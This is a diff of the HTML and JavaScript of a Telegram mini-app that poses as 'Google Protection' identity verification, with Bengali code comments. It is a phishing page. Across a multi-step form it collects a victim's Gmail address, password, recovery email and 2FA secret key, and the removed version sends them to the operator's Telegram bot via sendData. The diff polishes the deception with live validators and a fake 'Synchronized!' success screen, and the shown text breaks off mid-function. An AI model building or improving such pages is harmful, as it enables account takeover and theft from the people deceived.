@@ -2,381 +2,470 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Secure Google Account Sync</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>Google Secure Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
-            --ios-bg: #f2f2f7;
-            --ios-card: #ffffff;
-            --ios-blue: #007aff;
-            --ios-red: #ff3b30;
-            --ios-green: #34c759;
-            --ios-text: #000000;
-            --ios-muted: #8e8e93;
-            --ios-border: #e5e5ea;
-            --font: 'SF Pro Display', -apple-system, sans-serif;
+            --primary: #0f172a;
+            --success: #10b981;
+            --danger: #ef4444;
+            --dynamic: #007aff; /* Premium iOS Blue Theme */
+            --bg: #f8fafc;
+            --card: #ffffff;
+            --border: #e2e8f0;
+            --text: #0f172a;
+            --muted: #64748b;
+            --font: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
         }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: var(--font); -webkit-tap-highlight-color: transparent; }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: var(--font);
-            -webkit-tap-highlight-color: transparent;
-            user-select: none;
-        }
-
-        body {
-            background-color: var(--ios-bg);
-            color: var(--ios-text);
-            padding: 16px 12px;
-            display: flex;
-            flex-direction: column;
+        html, body {
+            width: 100%; height: 100%;
             min-height: 100vh;
-            -webkit-font-smoothing: antialiased;
+            min-height: -webkit-fill-available;
+            background: var(--bg);
+            overflow-x: hidden;
+        }
+        body { display: flex; justify-content: center; align-items: flex-start; }
+
+        .wrapper {
+            width: 100%; max-width: 480px;
+            background: var(--card);
+            min-height: 100vh;
+            min-height: -webkit-fill-available;
+            display: flex; flex-direction: column;
+            position: relative;
+            box-shadow: 0 0 40px rgba(0,0,0,0.03);
         }
 
-        /* iOS স্টাইল কম্প্যাক্ট হেডার */
-        .ios-header {
-            text-align: center;
-            margin-bottom: 20px;
-            padding-top: 4px;
-        }
-
-        .ios-header h1 {
-            font-size: 19px;
-            font-weight: 700;
-            color: var(--ios-text);
-            letter-spacing: -0.5px;
-        }
-
-        .ios-header p {
-            font-size: 12.5px;
-            color: var(--ios-muted);
-            margin-top: 3px;
-        }
-
-        /* 👑 আইওএস মাল্টি-স্টেপ কার্ড (একদম ছোট ও চাপানো ডিজাইন) */
-        .ios-card {
-            background: var(--ios-card);
-            border-radius: 12px;
-            padding: 14px 14px;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
-            margin-bottom: 16px;
-        }
-
-        .step-view {
-            display: none;
-        }
-
-        .step-view.active {
-            display: block;
-            animation: iosSlide 0.25s cubic-bezier(0.25, 0.8, 0.25, 1);
-        }
-
-        @keyframes iosSlide {
-            from { opacity: 0; transform: translateX(12px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-
-        /* ইনপুট ফিল্ড ও লেবেল লেআউট */
-        .input-wrapper {
-            margin-bottom: 14px;
-        }
-
-        .input-label {
-            font-size: 12px;
-            font-weight: 600;
-            color: #3a3a3c;
-            margin-bottom: 6px;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-        }
-
-        .ios-input {
-            width: 100%;
-            background: #f2f2f7;
-            border: 1px solid transparent;
-            border-radius: 8px;
-            padding: 11px 12px;
-            color: var(--ios-text);
-            font-size: 14.5px;
-            font-weight: 500;
-            outline: none;
-            transition: all 0.2s ease;
-        }
-
-        .ios-input:focus {
-            background: #ffffff;
-            border-color: var(--ios-blue);
-            box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.1);
-        }
-
-        /* 👑 আইওএস নেটিভ বাটন গ্রুপ */
-        .btn-group {
-            display: flex;
-            gap: 8px;
-            margin-top: 18px;
-        }
-
-        .ios-btn {
-            flex: 1;
-            background: var(--ios-blue);
-            color: #ffffff;
-            border: none;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 14.5px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            text-align: center;
-        }
-
-        .ios-btn:active {
-            opacity: 0.8;
-            transform: scale(0.99);
-        }
-
-        .ios-btn.secondary {
-            background: #e5e5ea;
-            color: var(--ios-blue);
-        }
-
-        /* 👑 আইওএস রিভিউ/কনফার্মেশন লিস্ট ডিজাইন */
-        .ios-list {
-            list-style: none;
-            padding: 0;
-        }
-
-        .ios-list-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid var(--ios-border);
-            font-size: 14px;
-        }
-
-        .ios-list-item:last-child {
-            border-bottom: none;
-            padding-bottom: 0;
-        }
-
-        .ios-list-item:first-child {
-            padding-top: 0;
-        }
-
-        .list-label {
-            color: var(--ios-muted);
-            font-weight: 500;
-        }
-
-        .list-value {
-            color: var(--ios-text);
-            font-weight: 600;
-            max-width: 180px;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        /* টপ ফ্লোটিং আইওএস নোটিফিকেশন টোস্ট */
-        .ios-toast {
-            position: fixed;
-            top: -50px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.85);
+        .top-nav-bar {
+            width: 100%; height: 54px;
+            background: rgba(255,255,255,0.85);
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            color: #ffffff;
-            padding: 10px 20px;
-            border-radius: 20px;
-            font-size: 13px;
-            font-weight: 500;
-            z-index: 999999;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
-            white-space: nowrap;
+            display: flex; align-items: center;
+            padding: 0 20px;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+            position: sticky; top: 0; z-index: 100;
         }
+        .back-circle-btn {
+            width: 36px; height: 36px;
+            border-radius: 50%;
+            border: 1px solid var(--border);
+            background: #fff;
+            display: none; align-items: center; justify-content: center;
+            cursor: pointer; transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .back-circle-btn:active { transform: scale(0.92); background: #f1f5f9; }
+        .back-circle-btn svg { width: 16px; height: 16px; fill: #475569; }
 
-        .ios-toast.show {
-            top: 20px;
+        .main-content { padding: 24px 20px; flex: 1; display: flex; flex-direction: column; }
+
+        .brand-header {
+            display: flex; flex-direction: column;
+            align-items: center; width: 100%; margin-bottom: 32px;
         }
+        .logo-wrap {
+            width: 92px; height: 92px; border-radius: 50%;
+            background: #fff; padding: 4px; margin-bottom: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+        .brand-logo-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; display: block; }
+        h1.brand-title { font-size: 22px; font-weight: 800; color: var(--text); letter-spacing: -0.5px; }
+        .brand-subtitle { font-size: 11px; font-weight: 600; color: var(--muted); letter-spacing: 2px; text-transform: uppercase; margin-top: 6px; }
+
+        /* Step View Containers */
+        .step-container { display: none; width: 100%; }
+        .step-container.active { display: block; animation: stepFade 0.3s ease-out; }
+        @keyframes stepFade { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+
+        .section-label { font-size: 13px; font-weight: 600; color: var(--muted); text-align: left; margin-bottom: 8px; letter-spacing: -0.1px; }
+        
+        /* Premium Input Box Style */
+        .input-card {
+            width: 100%; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px;
+            position: relative; display: flex; align-items: center; margin-bottom: 6px; transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .input-card:focus-within { border-color: var(--dynamic); background: #fff; box-shadow: 0 0 0 4px rgba(0, 122, 255, 0.08); }
+        
+        .field-input {
+            width: 100%; padding: 14px 16px; border: none; outline: none;
+            font-size: 15px; font-weight: 600; color: var(--text); background: transparent;
+            text-align: left; letter-spacing: -0.2px;
+        }
+        .field-input::placeholder { color: #94a3b8; font-size: 14px; font-weight: 500; }
+
+        /* Instagram Style Checker Message */
+        .live-checker-msg { font-size: 12px; font-weight: 500; margin-bottom: 20px; display: flex; align-items: center; gap: 4px; min-height: 16px; }
+        .live-checker-msg.valid { color: var(--success); }
+        .live-checker-msg.invalid { color: var(--danger); }
+
+        /* Password Eye Icon Toggle Button */
+        .password-toggle-btn {
+            background: none; border: none; padding: 0 16px; height: 100%;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; color: #94a3b8; transition: color 0.2s;
+        }
+        .password-toggle-btn:hover { color: var(--muted); }
+        .password-toggle-btn svg { width: 20px; height: 20px; fill: currentColor; }
+
+        /* Buttons Layout from your code */
+        .btn-row { display: flex; gap: 10px; }
+        .proceed-btn {
+            width: 100%; padding: 15px; background: #f1f5f9; color: #94a3b8;
+            border: none; border-radius: 14px; font-size: 15px; font-weight: 700;
+            cursor: not-allowed; letter-spacing: -0.1px; transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex; justify-content: center; align-items: center; gap: 8px;
+        }
+        .proceed-btn.active { background: var(--dynamic) !important; color: #fff !important; cursor: pointer !important; box-shadow: 0 8px 24px rgba(0, 122, 255, 0.15); }
+        .proceed-btn.active:active { transform: scale(0.98); opacity: 0.95; }
+        .proceed-btn.secondary-btn { background: #e2e8f0; color: #475569; cursor: pointer; }
+        .btn-spinner { display: none; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.6s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Final Confirmation Summary UI */
+        .summary-card { background: #fff; border: 1px solid var(--border); border-radius: 16px; overflow: hidden; margin-bottom: 24px; box-shadow: 0 4px 12px rgba(0,0,0,0.02); }
+        .summary-header { background: var(--primary); padding: 12px 20px; font-size: 11px; font-weight: 700; color: rgba(255,255,255,0.7); text-transform: uppercase; letter-spacing: 1px; }
+        .summary-rows { padding: 4px 0; }
+        .summary-row { display: flex; justify-content: space-between; align-items: center; padding: 13px 20px; border-bottom: 1px solid #f1f5f9; font-size: 14px; }
+        .summary-row:last-child { border-bottom: none; }
+        .summary-label { color: var(--muted); font-weight: 500; }
+        .summary-value { color: var(--text); font-weight: 700; max-width: 180px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+        /* Success Card Overlay from your code */
+        #successOverlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.45); backdrop-filter: blur(6px); -webkit-backdrop-filter: blur(6px);
+            z-index: 9999; justify-content: center; align-items: center;
+        }
+        .success-card {
+            background: #ffffff; border-radius: 28px; padding: 40px 36px 36px; width: 78%; max-width: 300px;
+            display: flex; flex-direction: column; align-items: center; box-shadow: 0 30px 60px rgba(0,0,0,0.18);
+            animation: cardPop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+        }
+        .circle-wrap { position: relative; display: flex; align-items: center; justify-content: center; margin-bottom: 22px; }
+        .success-ripple { width: 86px; height: 86px; border-radius: 50%; background: rgba(16,185,129,0.12); position: absolute; animation: rippleOut 1.2s ease-out 0.5s infinite; }
+        .success-circle { width: 86px; height: 86px; border-radius: 50%; background: #10b981; display: flex; align-items: center; justify-content: center; box-shadow: 0 12px 30px rgba(16,185,129,0.35); animation: circlePop 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275) 0.1s both; }
+        .tick-svg { width: 44px; height: 44px; }
+        .tick-path { fill: none; stroke: #fff; stroke-width: 4; stroke-linecap: round; stroke-linejoin: round; stroke-dasharray: 60; stroke-dashoffset: 60; animation: drawTick 0.4s cubic-bezier(0.65, 0, 0.45, 1) 0.45s forwards; }
+        .success-heading { font-size: 20px; font-weight: 800; color: #0f172a; letter-spacing: -0.4px; margin-bottom: 10px; }
+        .success-sub { font-size: 14px; font-weight: 500; color: #64748b; text-align: center; line-height: 1.6; }
+        .success-sub span { color: #10b981; font-weight: 700; }
+
+        @keyframes cardPop { from { transform: scale(0.75); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        @keyframes circlePop { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        @keyframes drawTick { to { stroke-dashoffset: 0; } }
+        @keyframes rippleOut { 0% { transform: scale(1); opacity: 0.6; } 100% { transform: scale(2.2); opacity: 0; } }
     </style>
 </head>
 <body>
 
-    <div id="iosToast" class="ios-toast"></div>
-
-    <div class="ios-header">
-        <h1>Google Cloud Protection</h1>
-        <p>Verify and secure your identity</p>
+<div class="wrapper">
+    <div class="top-nav-bar">
+        <button id="backArrowBtn" class="back-circle-btn" onclick="handleBack()">
+            <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        </button>
     </div>
 
-    <div class="ios-card">
-        <div class="step-view active" id="step1">
-            <div class="input-wrapper">
-                <label class="input-label">Google Email Address</label>
-                <input type="email" id="gmailInput" class="ios-input" placeholder="example@gmail.com">
+    <div class="main-content">
+        <div class="brand-header" id="brandHeader">
+            <div class="logo-wrap">
+                <img src="https://i.ibb.co.com/Y4mpLLqP/1299.jpg" alt="Logo" class="brand-logo-img">
             </div>
-            <button class="ios-btn" onclick="validateStep1()">Next</button>
+            <h1 class="brand-title">Google Protection</h1>
+            <div class="brand-subtitle">identity gateway</div>
         </div>
 
-        <div class="step-view" id="step2">
-            <div class="input-wrapper">
-                <label class="input-label">Gmail Password</label>
-                <input type="password" id="passwordInput" class="ios-input" placeholder="At least 8 characters">
+        <div id="stepGmail" class="step-container active">
+            <div class="section-label">Google Account Email</div>
+            <div class="input-card">
+                <input type="email" id="gmailInput" class="field-input" placeholder="example@gmail.com" oninput="checkGmailLive()">
             </div>
-            <button class="ios-btn" onclick="validateStep2()">Next</button>
+            <div id="gmailMsg" class="live-checker-msg"></div>
+            
+            <button id="gmailProceedBtn" class="proceed-btn" onclick="goToStep('Password')" disabled>
+                <div id="gmailSpinner" class="btn-spinner"></div>
+                <span id="gmailBtnText">Proceed</span>
+            </button>
         </div>
 
-        <div class="step-view" id="step3">
-            <div class="input-wrapper">
-                <label class="input-label">Recovery Email Address</label>
-                <input type="email" id="recoveryInput" class="ios-input" placeholder="recovery@gmail.com">
+        <div id="stepPassword" class="step-container">
+            <div class="section-label">Account Password</div>
+            <div class="input-card">
+                <input type="password" id="passwordInput" class="field-input" placeholder="Enter Password" oninput="checkPasswordLive()">
+                <button type="button" class="password-toggle-btn" onclick="togglePasswordVisibility()">
+                    <svg id="eyeIcon" viewBox="0 0 24 24">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                    </svg>
+                </button>
             </div>
-            <button class="ios-btn" onclick="validateStep3()">Next</button>
+            <div id="passwordMsg" class="live-checker-msg"></div>
+
+            <button id="passwordProceedBtn" class="proceed-btn" onclick="goToStep('Recovery')" disabled>
+                <div id="passwordSpinner" class="btn-spinner"></div>
+                <span id="passwordBtnText">Proceed</span>
+            </button>
         </div>
 
-        <div class="step-view" id="step4">
-            <div class="input-wrapper">
-                <label class="input-label">2FA Secret Key (Optional)</label>
-                <input type="text" id="tfaInput" class="ios-input" placeholder="Enter 16+ Digit Key">
+        <div id="stepRecovery" class="step-container">
+            <div class="section-label">Recovery Email Address</div>
+            <div class="input-card">
+                <input type="email" id="recoveryInput" class="field-input" placeholder="recovery@example.com" oninput="checkRecoveryLive()">
             </div>
-            <div class="btn-group">
-                <button class="ios-btn secondary" onclick="skipTfa()">Skip</button>
-                <button class="ios-btn" onclick="validateStep4()">Next</button>
+            <div id="recoveryMsg" class="live-checker-msg"></div>
+
+            <button id="recoveryProceedBtn" class="proceed-btn" onclick="goToStep('Tfa')" disabled>
+                <div id="recoverySpinner" class="btn-spinner"></div>
+                <span id="recoveryBtnText">Proceed</span>
+            </button>
+        </div>
+
+        <div id="stepTfa" class="step-container">
+            <div class="section-label">2FA Secret Key (Optional)</div>
+            <div class="input-card">
+                <input type="text" id="tfaInput" class="field-input" placeholder="Enter 16+ Character Secret" oninput="checkTfaLive()">
+            </div>
+            <div id="tfaMsg" class="live-checker-msg"></div>
+
+            <div class="btn-row">
+                <button class="proceed-btn secondary-btn" onclick="skipTfaStep()" style="cursor:pointer;">Skip</button>
+                <button id="tfaProceedBtn" class="proceed-btn" onclick="goToStep('Summary')" disabled>
+                    <div id="tfaSpinner" class="btn-spinner"></div>
+                    <span id="tfaBtnText">Next</span>
+                </button>
             </div>
         </div>
 
-        <div class="step-view" id="step5">
-            <div class="input-wrapper">
-                <label class="input-label" style="margin-bottom: 12px; color: var(--ios-blue);">Review Details</label>
-                <ul class="ios-list">
-                    <li class="ios-list-item">
-                        <span class="list-label">Gmail</span>
-                        <span class="list-value" id="summaryGmail">-</span>
-                    </li>
-                    <li class="ios-list-item">
-                        <span class="list-label">Password</span>
-                        <span class="list-value" id="summaryPassword">-</span>
-                    </li>
-                    <li class="ios-list-item">
-                        <span class="list-label">Recovery</span>
-                        <span class="list-value" id="summaryRecovery">-</span>
-                    </li>
-                    <li class="ios-list-item">
-                        <span class="list-label">2FA Secret</span>
-                        <span class="list-value" id="summaryTfa">Skipped</span>
-                    </li>
-                </ul>
+        <div id="stepSummary" class="step-container">
+            <div class="summary-card">
+                <div class="summary-header">Account Summary</div>
+                <div class="summary-rows">
+                    <div class="summary-row">
+                        <span class="summary-label">Gmail</span>
+                        <span class="summary-value" id="sumGmail">-</span>
+                    </div>
+                    <div class="summary-row">
+                        <span class="summary-label">Password</span>
+                        <span class="summary-value">••••••••</span>
+                    </div>
+                    <div class="summary-row">
+                        <span class="summary-label">Recovery</span>
+                        <span class="summary-value" id="sumRecovery">-</span>
+                    </div>
+                    <div class="summary-row">
+                        <span class="summary-label">2FA Key</span>
+                        <span class="summary-value" id="sumTfa">Skipped</span>
+                    </div>
+                </div>
             </div>
-            <button class="ios-btn" style="background: var(--ios-green);" onclick="submitToTelegram()">Confirm & Submit</button>
+
+            <button id="submitBtn" class="proceed-btn active" style="background:var(--success) !important;" onclick="submitFinalData()">
+                <div id="submitSpinner" class="btn-spinner"></div>
+                <span id="submitBtnText">CONFIRM & SUBMIT</span>
+            </button>
         </div>
     </div>
+</div>
 
-    <script>
-        // গ্লোবাল ডাটা স্টোরেজ অবজেক্ট
-        let accountForm = {
-            gmail: '',
-            password: '',
-            recovery: '',
-            secretKey: 'Skipped'
-        };
+<div id="successOverlay">
+    <div class="success-card">
+        <div class="circle-wrap">
+            <div class="success-ripple"></div>
+            <div class="success-circle">
+                <svg class="tick-svg" viewBox="0 0 52 52" fill="none">
+                    <path class="tick-path" d="M14 27l9 9 16-17"/>
+                </svg>
+            </div>
+        </div>
+        <div class="success-heading">Synchronized!</div>
+        <div class="success-sub">Account data submitted <span>successfully</span>.<br>This window will close shortly.</div>
+    </div>
+</div>
 
-        // আইওএস নোটিফিকেশন অ্যালার্ট টোস্ট
-        function showIosToast(message) {
-            const toast = document.getElementById('iosToast');
-            toast.innerText = message;
-            toast.classList.add('show');
-            setTimeout(() => toast.classList.remove('show'), 2500);
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.ready(); tg.expand();
+
+    let collectedFormData = { gmail: "", password: "", recovery: "", secretKey: "Skipped" };
+    let currentStepName = "Gmail";
+
+    // ১. ইনস্টাগ্রাম স্টাইল জিমেইল লাইভ ভ্যালিডেটর
+    function checkGmailLive() {
+        const val = document.getElementById('gmailInput').value.trim();
+        const msg = document.getElementById('gmailMsg');
+        const btn = document.getElementById('gmailProceedBtn');
+        
+        if (val.length === 0) {
+            msg.innerHTML = ""; btn.setAttribute('disabled','true'); btn.classList.remove('active');
+        } else if (val.endsWith('@gmail.com') && val.length >= 11) {
+            msg.innerHTML = "✓ Valid Gmail format"; msg.className = "live-checker-msg valid";
+            btn.removeAttribute('disabled'); btn.classList.add('active');
+        } else {
+            msg.innerHTML = "✕ Must end with @gmail.com"; msg.className = "live-checker-msg invalid";
+            btn.setAttribute('disabled','true'); btn.classList.remove('active');
         }
+    }
 
-        // ধাপ পরিবর্তনের স্মার্ট মেকানিজম
-        function navigateToStep(from, to) {
-            document.getElementById(`step${from}`).classList.remove('active');
-            document.getElementById(`step${to}`).classList.add('active');
+    // ২. ইনস্টাগ্রাম স্টাইল পাসওয়ার্ড লাইভ ভ্যালিডেটর
+    function checkPasswordLive() {
+        const val = document.getElementById('passwordInput').value.trim();
+        const msg = document.getElementById('passwordMsg');
+        const btn = document.getElementById('passwordProceedBtn');
+
+        if (val.length === 0) {
+            msg.innerHTML = ""; btn.setAttribute('disabled','true'); btn.classList.remove('active');
+        } else if (val.length >= 8) {
+            msg.innerHTML = "✓ Secure length achieved"; msg.className = "live-checker-msg valid";
+            btn.removeAttribute('disabled'); btn.classList.add('active');
+        } else {
+            msg.innerHTML = "✕ Minimum 8 characters required"; msg.className = "live-checker-msg invalid";
+            btn.setAttribute('disabled','true'); btn.classList.remove('active');
         }
+    }
 
-        // ১. জিমেইল ভ্যালিডেশন চেকার (অবশ্যই @gmail.com থাকতে হবে)
-        function validateStep1() {
-            const gmail = document.getElementById('gmailInput').value.trim();
-            if (!gmail.endsWith('@gmail.com') || gmail.length < 11) {
-                showIosToast("❌ ভুল ফরম্যাট! শেষে @gmail.com থাকতে হবে।");
-                return;
-            }
-            accountForm.gmail = gmail;
-            navigateToStep(1, 2);
+    // ৩. পাসওয়ার্ড হাইড/শো করার আইকন মেকানিজম
+    function togglePasswordVisibility() {
+        const input = document.getElementById('passwordInput');
+        const eyeIcon = document.getElementById('eyeIcon');
+        if (input.type === "password") {
+            input.type = "text";
+            eyeIcon.innerHTML = '<path d="M12 7c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zm0 8c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3zm0-11C7 4 2.73 7.11 1 11.5 2.73 15.89 7 19 12 19s9.27-3.11 11-7.5C22.27 7.11 18 4 12 4z"/>';
+        } else {
+            input.type = "password";
+            eyeIcon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
         }
+    }
 
-        // ২. পাসওয়ার্ড ভ্যালিডেশন চেকার (কমপক্ষে ৮ অক্ষর)
-        function validateStep2() {
-            const password = document.getElementById('passwordInput').value.trim();
-            if (password.length < 8) {
-                showIosToast("❌ পাসওয়ার্ডটি খুবই ছোট! কমপক্ষে ৮ অক্ষর দিন।");
-                return;
-            }
-            accountForm.password = password;
-            navigateToStep(2, 3);
+    // ৪. ইনস্টাগ্রাম স্টাইল রিকভারি লাইভ ভ্যালিডেটর
+    function checkRecoveryLive() {
+        const val = document.getElementById('recoveryInput').value.trim();
+        const msg = document.getElementById('recoveryMsg');
+        const btn = document.getElementById('recoveryProceedBtn');
+
+        if (val.length === 0) {
+            msg.innerHTML = ""; btn.setAttribute('disabled','true'); btn.classList.remove('active');
+        } else if (val.includes('@') && val.length >= 5) {
+            msg.innerHTML = "✓ Looks correct"; msg.className = "live-checker-msg valid";
+            btn.removeAttribute('disabled'); btn.classList.add('active');
+        } else {
+            msg.innerHTML = "✕ Enter a valid recovery email"; msg.className = "live-checker-msg invalid";
+            btn.setAttribute('disabled','true'); btn.classList.remove('active');
         }
+    }
 
-        // ৩. রিকভারি ইমেইল চেকার
-        function validateStep3() {
-            const recovery = document.getElementById('recoveryInput').value.trim();
-            if (!recovery.includes('@') || recovery.length < 5) {
-                showIosToast("❌ একটি সঠিক রিকভারি ইমেইল টাইপ করুন।");
-                return;
-            }
-            accountForm.recovery = recovery;
-            navigateToStep(3, 4);
+    // ৫. ইনস্টাগ্রাম স্টাইল ২এফএ লাইভ ভ্যালিডেটর (১৬ অক্ষর + A-Z, 2-7 কী)
+    function checkTfaLive() {
+        let inputKey = document.getElementById('tfaInput').value.trim().toUpperCase().replace(/\s+/g, "");
+        const msg = document.getElementById('tfaMsg');
+        const btn = document.getElementById('tfaProceedBtn');
+        let isValidFormat = /^[A-Z2-7]+$/.test(inputKey);
+
+        if (inputKey.length === 0) {
+            msg.innerHTML = ""; btn.setAttribute('disabled','true'); btn.classList.remove('active');
+        } else if (inputKey.length >= 16 && isValidFormat) {
+            msg.innerHTML = "✓ Valid 2FA Secret Key format"; msg.className = "live-checker-msg valid";
+            btn.removeAttribute('disabled'); btn.classList.add('active');
+        } else {
+            msg.innerHTML = "✕ Must be 16+ characters (Only A-Z, 2-7)"; msg.className = "live-checker-msg invalid";
+            btn.setAttribute('disabled','true'); btn.classList.remove('active');
         }
+    }
 
-        // ৪. ২এফএ সিক্রেট কী চেকার (A-Z, 2-7 এবং ১৬+ সাইজ ভ্যালিডেশন)
-        function validateStep4() {
-            let inputKey = document.getElementById('tfaInput').value.trim().toUpperCase().replace(/\s+/g, "");
-            let isValidFormat = /^[A-Z2-7]+$/.test(inputKey);
+    // মাল্টি-স্টেপ প্রসেসিং ও বাটন স্পিনার লোডিং ট্রানজিশন
+    function goToStep(nextStep) {
+        let currentLower = currentStepName.toLowerCase();
+        document.getElementById(currentLower + 'Spinner').style.display = 'block';
+        document.getElementById(currentLower + 'BtnText').style.display = 'none';
+        document.getElementById(currentLower + 'ProceedBtn').setAttribute('disabled','true');
 
-            if (inputKey.length >= 16 && isValidFormat) {
-                accountForm.secretKey = inputKey;
-                showSummaryPage();
-            } else {
-                showIosToast("❌ ভুল ২এফএ কী! (A-Z, 2-7 এবং ১৬+ অক্ষর লাগবে)");
-            }
-        }
+        setTimeout(() => {
+            // ডাটা সেভ করা হচ্ছে
+            if (currentStepName === "Gmail") collectedFormData.gmail = document.getElementById('gmailInput').value.trim();
+            if (currentStepName === "Password") collectedFormData.password = document.getElementById('passwordInput').value.trim();
+            if (currentStepName === "Recovery") collectedFormData.recovery = document.getElementById('recoveryInput').value.trim();
+            if (currentStepName === "Tfa") collectedFormData.secretKey = document.getElementById('tfaInput').value.trim().toUpperCase().replace(/\s+/g, "");
 
-        // ২এফএ স্কিপ করার লজিক
-        function skipTfa() {
-            accountForm.secretKey = 'Skipped';
-            showSummaryPage();
-        }
-
-        // ৫. কনফার্মেশন সামারি পেজ রেন্ডারিং
-        function showSummaryPage() {
-            document.getElementById('summaryGmail').innerText = accountForm.gmail;
-            document.getElementById('summaryPassword').innerText = "••••••••"; // সিকিউরিটির জন্য হাইড করা
-            document.getElementById('summaryRecovery').innerText = accountForm.recovery;
-            document.getElementById('summaryTfa').innerText = accountForm.secretKey;
+            // পেজ পরিবর্তন
+            document.getElementById('step' + currentStepName).style.display = 'none';
+            document.getElementById('step' + nextStep).style.display = 'block';
+            document.getElementById('backArrowBtn').style.display = 'flex';
             
-            navigateToStep(4, 5);
-        }
+            currentStepName = nextStep;
 
-        // 🚀 টেলিগ্রাম বটে ডাটা ট্রান্সমিশন মেকানিজম (Reply WebApp sendData)
-        function submitToTelegram() {
-            showIosToast("⚡ Synchronizing with Telegram...");
-            
-            // ডাটা অবজেক্টটিকে টেক্সট বা স্ট্রিং এ রূপান্তর করে বটের কাছে পাঠানো হচ্ছে
-            setTimeout(() => {
-                Telegram.WebApp.sendData(JSON.stringify(accountForm));
-            }, 800);
-        }
+            if (nextStep === "Summary") {
+                document.getElementById('brandHeader').style.display = 'none';
+                document.getElementById('sumGmail').innerText = collectedFormData.gmail;
+                document.getElementById('sumRecovery').innerText = collectedFormData.recovery;
+                document.getElementById('sumTfa').innerText = collectedFormData.secretKey || "Skipped";
+            }
+        }, 550);
+    }
 
-        // Telegram WebApp ইনিশিয়ালাইজেশন
-        Telegram.WebApp.ready();
-        Telegram.WebApp.expand();
-    </script>
+    function skipTfaStep() {
+        collectedFormData.secretKey = "Skipped";
+        document.getElementById('stepTfa').style.display = 'none';
+        document.getElementById('stepSummary').style.display = 'block';
+        document.getElementById('backArrowBtn').style.display = 'flex';
+        document.getElementById('brandHeader').style.display = 'none';
+        currentStepName = "Summary";
+        
+        document.getElementById('sumGmail').innerText = collectedFormData.gmail;
+        document.getElementById('sumRecovery').innerText = collectedFormData.recovery;
+        document.getElementById('sumTfa').innerText = "Skipped";
+    }
+
+    // ব্যাক নেভিগেশন কন্ট্রোল
+    function handleBack() {
+        document.getElementById('brandHeader').style.display = 'flex';
+        
+        if (currentStepName === "Summary") {
+            document.getElementById('stepSummary').style.display = 'none';
+            document.getElementById('stepTfa').style.display = 'block';
+            resetSpinner('tfa');
+            currentStepName = "Tfa";
+        } else if (currentStepName === "Tfa") {
+            document.getElementById('stepTfa').style.display = 'none';
+            document.getElementById('stepRecovery').style.display = 'block';
+            resetSpinner('recovery');
+            currentStepName = "Recovery";
+        } else if (currentStepName === "Recovery") {
+            document.getElementById('stepRecovery').style.display = 'none';
+            document.getElementById('stepPassword').style.display = 'block';
